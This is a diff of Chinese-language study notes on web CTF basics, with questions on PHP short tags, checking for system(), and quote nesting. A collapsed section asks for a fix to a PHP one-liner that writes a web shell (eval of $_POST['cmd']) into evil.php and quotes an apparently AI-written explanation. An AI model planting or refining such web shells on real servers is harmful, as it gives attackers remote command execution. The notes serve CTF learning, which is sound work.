@@ -5,16 +5,14 @@
 ----
 
 #### web ctf基础知识
-- <?= ?>里面能包含几条语句？
-- <?php var_dump(function_exists('system')); ?>有什么用，都能检测什么？
-- 如果url参数里要出现类似于"test'test"test"test'test"，为了避免引号过早闭合，最好的解决方法是什么？
+- `<?= ?>`里面能包含几条语句？
+- `<?php var_dump(function_exists('system')); ?>`有什么用，都能检测什么？
+- 如果php里要出现类似于"test'test"test"test'test"，为了避免引号过早闭合，最好的解决方法是什么？
 <details>
-<summary>修正pyload：
-```php
-<?php
-system('echo "<?= eval(system("$_POST['cmd']"))" > evil.php')
-?>
-```
+
+<summary>
+
+修正此pyload：`<?= system('echo "<?= eval(system("$_POST['cmd']"))" > evil.php')?>`
 </summary>
 
 在处理你给出的这段代码时，我们需要从**技术实现**和**安全性**两个维度来分析。
@@ -152,6 +150,7 @@ file_put_contents('evil.php', $code);
 
 **你想深入了解一下 PHP 字符串中单引号和双引号在处理转义字符（如 `\n`, `\t`, `\$`）时的具体区别吗？**
 </details>
+
 - index.php是做什么的？
 - 如果把index.php删掉了会怎样？
 - index.php只能叫index.php吗？
